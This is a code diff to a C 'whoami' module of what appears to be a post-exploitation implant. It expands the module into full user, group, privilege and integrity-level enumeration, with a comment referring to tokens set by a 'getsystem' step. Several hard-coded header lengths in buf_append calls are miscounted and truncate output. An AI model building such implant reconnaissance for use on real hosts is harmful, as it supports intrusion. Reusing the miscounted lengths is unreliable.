@@ -161,8 +161,47 @@ void sysinfo_collect(Buffer *tlv_out) {
 
 /* ─── Module: whoami ─── */
 
+/* Helper: map SID_NAME_USE enum to display string */
+static const char *sid_type_str(SID_NAME_USE snu) {
+    switch (snu) {
+        case SidTypeUser:           return "User";
+        case SidTypeGroup:          return "Group";
+        case SidTypeDomain:         return "Domain";
+        case SidTypeAlias:          return "Alias";
+        case SidTypeWellKnownGroup: return "Well-known group";
+        case SidTypeDeletedAccount: return "Deleted account";
+        case SidTypeInvalid:        return "Invalid";
+        case SidTypeComputer:       return "Computer";
+        case SidTypeLabel:          return "Label";
+        default:                    return "Unknown";
+    }
+}
+
+/* Helper: decode group attributes bitmask to readable string */
+static void group_attrs_str(DWORD attrs, char *buf, DWORD buf_size) {
+    buf[0] = '\0';
+    if (attrs & SE_GROUP_MANDATORY)
+        strncat(buf, "Mandatory group, ", buf_size - strlen(buf) - 1);
+    if (attrs & SE_GROUP_ENABLED_BY_DEFAULT)
+        strncat(buf, "Enabled by default, ", buf_size - strlen(buf) - 1);
+    if (attrs & SE_GROUP_ENABLED)
+        strncat(buf, "Enabled group, ", buf_size - strlen(buf) - 1);
+    if (attrs & SE_GROUP_OWNER)
+        strncat(buf, "Group owner, ", buf_size - strlen(buf) - 1);
+    if (attrs & SE_GROUP_USE_FOR_DENY_ONLY)
+        strncat(buf, "Deny only, ", buf_size - strlen(buf) - 1);
+    if (attrs & SE_GROUP_INTEGRITY)
+        strncat(buf, "Integrity, ", buf_size - strlen(buf) - 1);
+    if (attrs & SE_GROUP_LOGON_ID)
+        strncat(buf, "Logon ID, ", buf_size - strlen(buf) - 1);
+    /* Trim trailing ", " */
+    size_t len = strlen(buf);
+    if (len >= 2 && buf[len - 2] == ',')
+        buf[len - 2] = '\0';
+}
+
 void mod_whoami(Buffer *out) {
-    char line[512];
+    char line[1024];
     HANDLE hToken;
 
     /* Try thread token first (set by ImpersonateLoggedOnUser / getsystem BOF),
@@ -174,14 +213,14 @@ void mod_whoami(Buffer *out) {
         }
     }
 
-    /* Username */
+    /* ── USER INFORMATION ── */
     DWORD token_len;
     GetTokenInformation(hToken, TokenUser, NULL, 0, &token_len);
     unsigned char *token_buf = (unsigned char *)malloc(token_len);
     GetTokenInformation(hToken, TokenUser, token_buf, token_len, &token_len);
     TOKEN_USER *tu = (TOKEN_USER *)token_buf;
 
-    char name[128], domain[128];
+    char name[256], domain[256];
     DWORD name_len = sizeof(name), domain_len = sizeof(domain);
     SID_NAME_USE snu;
     LookupAccountSidA(NULL, tu->User.Sid, name, &name_len, domain, &domain_len, &snu);
@@ -189,63 +228,129 @@ void mod_whoami(Buffer *out) {
     char *sid_str = NULL;
     ConvertSidToStringSidA(tu->User.Sid, &sid_str);
 
-    snprintf(line, sizeof(line), "Username:  %s\\%s\nSID:       %s\n", domain, name, sid_str ? sid_str : "?");
+    char fullname[512];
+    snprintf(fullname, sizeof(fullname), "%s\\%s", domain, name);
+
+    buf_append(out, "\nUSER INFORMATION\n", 17);
+    buf_append(out, "----------------\n", 17);
+    snprintf(line, sizeof(line), "%-45s %s\n", "User Name", "SID");
+    buf_append(out, line, (DWORD)strlen(line));
+    snprintf(line, sizeof(line), "%-45s %s\n",
+             "=============================================",
+             "============================================");
+    buf_append(out, line, (DWORD)strlen(line));
+    snprintf(line, sizeof(line), "%-45s %s\n", fullname, sid_str ? sid_str : "?");
     buf_append(out, line, (DWORD)strlen(line));
     if (sid_str) LocalFree(sid_str);
     free(token_buf);
 
-    /* Integrity */
+    /* ── GROUP INFORMATION ── */
+    GetTokenInformation(hToken, TokenGroups, NULL, 0, &token_len);
+    token_buf = (unsigned char *)malloc(token_len);
+    if (GetTokenInformation(hToken, TokenGroups, token_buf, token_len, &token_len)) {
+        TOKEN_GROUPS *tg = (TOKEN_GROUPS *)token_buf;
+
+        buf_append(out, "\nGROUP INFORMATION\n", 18);
+        buf_append(out, "-----------------\n", 18);
+        snprintf(line, sizeof(line), "%-50s %-18s %-50s %s\n",
+                 "Group Name", "Type", "SID", "Attributes");
+        buf_append(out, line, (DWORD)strlen(line));
+        snprintf(line, sizeof(line), "%-50s %-18s %-50s %s\n",
+                 "==================================================",
+                 "==================",
+                 "==================================================",
+                 "==============================");
+        buf_append(out, line, (DWORD)strlen(line));
+
+        for (DWORD i = 0; i < tg->GroupCount; i++) {
+            char gname[256] = {0}, gdomain[256] = {0};
+            DWORD gn_len = sizeof(gname), gd_len = sizeof(gdomain);
+            SID_NAME_USE gsnu;
+            char gfull[512] = {0};
+            char *gsid_str = NULL;
+            char attr_buf[512] = {0};
+
+            if (LookupAccountSidA(NULL, tg->Groups[i].Sid, gname, &gn_len,
+                                  gdomain, &gd_len, &gsnu)) {
+                if (gdomain[0])
+                    snprintf(gfull, sizeof(gfull), "%s\\%s", gdomain, gname);
+                else
+                    snprintf(gfull, sizeof(gfull), "%s", gname);
+            } else {
+                snprintf(gfull, sizeof(gfull), "(unknown)");
+                gsnu = SidTypeUnknown;
+            }
+
+            ConvertSidToStringSidA(tg->Groups[i].Sid, &gsid_str);
+            group_attrs_str(tg->Groups[i].Attributes, attr_buf, sizeof(attr_buf));
+
+            snprintf(line, sizeof(line), "%-50s %-18s %-50s %s\n",
+                     gfull, sid_type_str(gsnu),
+                     gsid_str ? gsid_str : "?", attr_buf);
+            buf_append(out, line, (DWORD)strlen(line));
+            if (gsid_str) LocalFree(gsid_str);
+        }
+    }
+    free(token_buf);
+
+    /* ── PRIVILEGES INFORMATION ── */
+    GetTokenInformation(hToken, TokenPrivileges, NULL, 0, &token_len);
+    token_buf = (unsigned char *)malloc(token_len);
+    if (GetTokenInformation(hToken, TokenPrivileges, token_buf, token_len, &token_len)) {
+        TOKEN_PRIVILEGES *tp = (TOKEN_PRIVILEGES *)token_buf;
+
+        buf_append(out, "\nPRIVILEGES INFORMATION\n", 22);
+        buf_append(out, "----------------------\n", 22);
+        snprintf(line, sizeof(line), "%-42s %-52s %s\n",
+                 "Privilege Name", "Description", "State");
+        buf_append(out, line, (DWORD)strlen(line));
+        snprintf(line, sizeof(line), "%-42s %-52s %s\n",
+                 "==========================================",
+                 "====================================================",
+                 "=============");
+        buf_append(out, line, (DWORD)strlen(line));
+
+        for (DWORD i = 0; i < tp->PrivilegeCount; i++) {
+            char priv_name[128] = {0};
+            DWORD pn_len = sizeof(priv_name);
+            LookupPrivilegeNameA(NULL, &tp->Privileges[i].Luid, priv_name, &pn_len);
+
+            /* Get human-readable description via LookupPrivilegeDisplayNameA */
+            char priv_desc[256] = {0};
+            DWORD pd_len = sizeof(priv_desc);
+            DWORD lang_id = 0;
+            if (!LookupPrivilegeDisplayNameA(NULL, priv_name, priv_desc, &pd_len, &lang_id))
+                strncpy(priv_desc, "(no description)", sizeof(priv_desc) - 1);
+
+            const char *status = (tp->Privileges[i].Attributes & SE_PRIVILEGE_ENABLED)
+                                 ? "Enabled" : "Disabled";
+            snprintf(line, sizeof(line), "%-42s %-52s %s\n", priv_name, priv_desc, status);
+            buf_append(out, line, (DWORD)strlen(line));
+        }
+    }
+    free(token_buf);
+
+    /* ── INTEGRITY LEVEL ── */
     GetTokenInformation(hToken, TokenIntegrityLevel, NULL, 0, &token_len);
     token_buf = (unsigned char *)malloc(token_len);
     if (GetTokenInformation(hToken, TokenIntegrityLevel, token_buf, token_len, &token_len)) {
         TOKEN_MANDATORY_LABEL *tml = (TOKEN_MANDATORY_LABEL *)token_buf;
         DWORD *sub = GetSidSubAuthority(tml->Label.Sid,
                      *GetSidSubAuthorityCount(tml->Label.Sid) - 1);
-        const char *level = "Medium";
-        if (*sub >= 0x4000) level = "System";
-        else if (*sub >= 0x3000) level = "High";
-        else if (*sub < 0x2000) level = "Low";
-        snprintf(line, sizeof(line), "Integrity: %s\n", level);
+        const char *level = "Medium Mandatory Level";
+        if (*sub >= 0x4000) level = "System Mandatory Level";
+        else if (*sub >= 0x3000) level = "High Mandatory Level";
+        else if (*sub < 0x2000) level = "Low Mandatory Level";
+
+        char *int_sid = NULL;
+        ConvertSidToStringSidA(tml->Label.Sid, &int_sid);
+        snprintf(line, sizeof(line), "\nIntegrity: %s (%s)\n",
+                 level, int_sid ? int_sid : "?");
         buf_append(out, line, (DWORD)strlen(line));
+        if (int_sid) LocalFree(int_sid);
     }
     free(token_buf);
 
-    /* Privileges */
-    GetTokenInformation(hToken, TokenPrivileges, NULL, 0, &token_len);
-    token_buf = (unsigned char *)malloc(token_len);
-    if (GetTokenInformation(hToken, TokenPrivileges, token_buf, token_len, &token_len)) {
-        TOKEN_PRIVILEGES *tp = (TOKEN_PRIVILEGES *)token_buf;
-        buf_append(out, "\n=== PRIVILEGES ===\n", 19);
-        for (DWORD i = 0; i < tp->PrivilegeCount; i++) {
-            char priv_name[128] = {0};
-            DWORD pn_len = sizeof(priv_name);
-            LookupPrivilegeNameA(NULL, &tp->Privileges[i].Luid, priv_name, &pn_len);
-            const char *status = (tp->Privileges[i].Attributes & SE_PRIVILEGE_ENABLED)
-                                 ? "ENABLED" : "DISABLED";
-            snprintf(line, sizeof(line), "  %-45s %s\n", priv_name, status);
-            buf_append(out, line, (DWORD)strlen(line));
-        }
-    }
-    free(token_buf);
-
-    /* Groups */
-    GetTokenInformation(hToken, TokenGroups, NULL, 0, &token_len);
-    token_buf = (unsigned char *)malloc(token_len);
-    if (GetTokenInformation(hToken, TokenGroups, token_buf, token_len, &token_len)) {
-        TOKEN_GROUPS *tg = (TOKEN_GROUPS *)token_buf;
-        buf_append(out, "\n=== GROUP MEMBERSHIP ===\n", 25);
-        for (DWORD i = 0; i < tg->GroupCount; i++) {
-            char gname[128] = {0}, gdomain[128] = {0};
-            DWORD gn_len = sizeof(gname), gd_len = sizeof(gdomain);
-            SID_NAME_USE gsnu;
-            if (LookupAccountSidA(NULL, tg->Groups[i].Sid, gname, &gn_len,
-                                  gdomain, &gd_len, &gsnu)) {
-                snprintf(line, sizeof(line), "  %s\\%s\n", gdomain, gname);
-                buf_append(out, line, (DWORD)strlen(line));
-            }
-        }
-    }
-    free(token_buf);
     CloseHandle(hToken);
 }
 
